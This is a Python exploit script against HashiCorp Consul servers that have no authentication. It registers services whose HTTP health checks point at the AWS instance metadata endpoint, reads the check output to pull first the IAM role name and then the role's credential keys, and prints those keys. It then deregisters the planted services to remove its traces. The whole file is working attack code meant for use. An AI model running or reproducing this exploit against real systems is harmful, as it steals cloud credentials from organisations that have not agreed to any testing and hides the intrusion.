#!/usr/bin/env python
#
#
# Author: random_robbie

import colorama
import sys
import os
import re
import json
import requests
from time import sleep
import base64
import argparse
from colorama import init, Fore, Back, Style
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import urllib3
urllib3.disable_warnings()
init(autoreset=True)


# Configuration
session = requests.Session()
parser = argparse.ArgumentParser()
parser.add_argument("-s", "--server", required=True, help="Consule Server IP")

args = parser.parse_args()

def remove_services(URL):
	
	headers = {"Accept":"application/json, text/javascript, */*; q=0.01","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0","Referer":"http://"+URL+"/ui/","Connection":"close","Accept-Language":"en-GB,en;q=0.5","Accept-Encoding":"gzip, deflate","DNT":"1"}
	response = session.put(""+URL+"/v1/agent/service/deregister/AWSIAM-Grabber-P1", headers=headers, verify=False)
	if response.status_code == 200:
		print (Fore.GREEN + "[*] Payload One Removed [*]")
	else:
		print(Fore.RED + '[!] Unable To Remove Payload One')
		
	response2 = session.put(""+URL+"/v1/agent/service/deregister/AWSIAM-Grabber-IAMNAMEGRAB", headers=headers, verify=False)
	if response2.status_code == 200:
		print (Fore.GREEN + "[*] Payload One Removed [*]")
	else:
		print(Fore.RED + '[!] Unable To Remove Payload One')
		
	response3 = session.put(""+URL+"/v1/agent/service/deregister/AWSIAM-Grabber-IAMNAMEGRAB2", headers=headers, verify=False)
	if response3.status_code == 200:
		print (Fore.GREEN + "[*] Payload Two Removed [*]")
	else:
		print(Fore.RED + '[!] Unable To Remove Payload Two')
		
	response4 = session.put(""+URL+"/v1/agent/service/deregister/AWSIAM-Grabber-P2", headers=headers, verify=False)
	if response4.status_code == 200:
		print (Fore.GREEN + "[*] Payload Two Removed [*]")
	else:
		print(Fore.RED + '[!] Unable To Remove Payload Two')
		

def grab_dc (URL):

	headers = {"Accept":"application/json, text/javascript, */*; q=0.01","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0","Referer":"http://"+URL+"/ui/","Connection":"close","Accept-Language":"en-GB,en;q=0.5","Accept-Encoding":"gzip, deflate","DNT":"1"}
	response = session.get(""+URL+"/v1/catalog/datacenters", headers=headers, verify=False)
	if response.status_code == 200:
		js = json.loads(response.content)
		dc = js[0]
		print (Fore.GREEN + "[*] Datacenter Chosen [*]")
		return dc
	else:
		print(Fore.RED + '[!] Unable to parse DC\n')
		exit();
		
		
def send_payload_one (URL):
	
	payload = '''{
  "ID": "AWSIAM-Grabber-P1",
  "Name": "AWSIAM-Grabber-IAMNAMEGRAB",
  "Tags": [],
  "Address": "169.254.169.254",
  "Port": 80,
  "Check": {
    "Interval": "10s",
    "HTTP": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     "DeregisterCriticalServiceAfter": "10m"
  }
}
'''
	headers = {"Accept":"application/json, text/javascript, */*; q=0.01","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0","Referer":""+URL+"/ui/","Connection":"close","Accept-Language":"en-GB,en;q=0.5","Accept-Encoding":"gzip, deflate","DNT":"1"}
	response = session.put(""+URL+"/v1/agent/service/register", data=payload, headers=headers, verify=False)
	if response.status_code == 200:
		print (Fore.GREEN + "[*] Payload One Sent [*]")
	else:
		print(Fore.RED + '[!] Payload One Failed\n')
		exit();
		
		
def send_payload_two (URL,IAM):
	
	payload = '''{
  "ID": "AWSIAM-Grabber-P2",
  "Name": "AWSIAM-Grabber-IAMNAMEGRAB2",
  "Tags": [],
  "Address": "169.254.169.254",
  "Port": 80,
  "Check": {
    "Interval": "10s",
    "HTTP": "http://169.254.169.254/latest/meta-data/iam/security-credentials/'''+IAM+'''/",
     "DeregisterCriticalServiceAfter": "10m"
  }
}
'''

	headers = {"Accept":"application/json, text/javascript, */*; q=0.01","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0","Referer":""+URL+"/ui/","Connection":"close","Accept-Language":"en-GB,en;q=0.5","Accept-Encoding":"gzip, deflate","DNT":"1"}
	response = session.put(""+URL+"/v1/agent/service/register", data=payload, headers=headers, verify=False)
	if response.status_code == 200:
		print (Fore.GREEN + "[*] Payload Two Sent [*]")
	else:
		print(Fore.RED + '[!] Payload Two Failed\n')
		exit();

def parse_payload_one(URL,DC):
	paramsGet = {"dc":DC,"token":""}
	headers = {"Accept":"application/json, text/javascript, */*; q=0.01","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0","Referer":""+URL+"/ui/","Connection":"close","Accept-Language":"en-GB,en;q=0.5","Accept-Encoding":"gzip, deflate","DNT":"1"}
	response = session.get(""+URL+"/v1/internal/ui/nodes", params=paramsGet, headers=headers, verify=False)
	if response.status_code == 200:
		js = json.loads(response.content)
		for p in js:
			for Serv in p['Checks']:
				
				if Serv['ServiceName'] == "AWSIAM-Grabber-IAMNAMEGRAB":
					out = Serv['Output']
					IAM = out.replace("HTTP GET http://169.254.169.254/latest/meta-data/iam/security-credentials/: 200 OK Output: ","")
					print (Fore.GREEN + "[*] IAM Role Name: "+IAM+" [*]")
					return IAM

					
					
def parse_payload_two(URL,DC):
	paramsGet = {"dc":DC,"token":""}
	headers = {"Accept":"application/json, text/javascript, */*; q=0.01","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0","Referer":""+URL+"/ui/","Connection":"close","Accept-Language":"en-GB,en;q=0.5","Accept-Encoding":"gzip, deflate","DNT":"1"}
	response = session.get(""+URL+"/v1/internal/ui/nodes", params=paramsGet, headers=headers, verify=False)
	if response.status_code == 200:
		js = json.loads(response.content)
		for p in js:
			for Serv in p['Checks']:
				
				if Serv['ServiceName'] == "AWSIAM-Grabber-IAMNAMEGRAB2":
					IAMKEYS = Serv['Output']
					print (Fore.GREEN + "[*] IAM Role Keys: "+IAMKEYS+" [*]")

	
	


try:
	URL = args.server
	DC = grab_dc (URL)
	send_payload_one (URL)
	print (Fore.GREEN + "[*] Sleeping 10 seconds to allow time for system to parse. [*]")
	sleep (10)
	IAM = parse_payload_one(URL,DC)
	send_payload_two (URL,IAM)
	print (Fore.GREEN + "[*] Sleeping 10 seconds to allow time for system to parse. [*]")
	sleep (10)
	parse_payload_two(URL,DC)
	remove_services(URL)
		
except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
				
except Exception as e:
		print('Error: %s' % e)
		print['data']
		pass
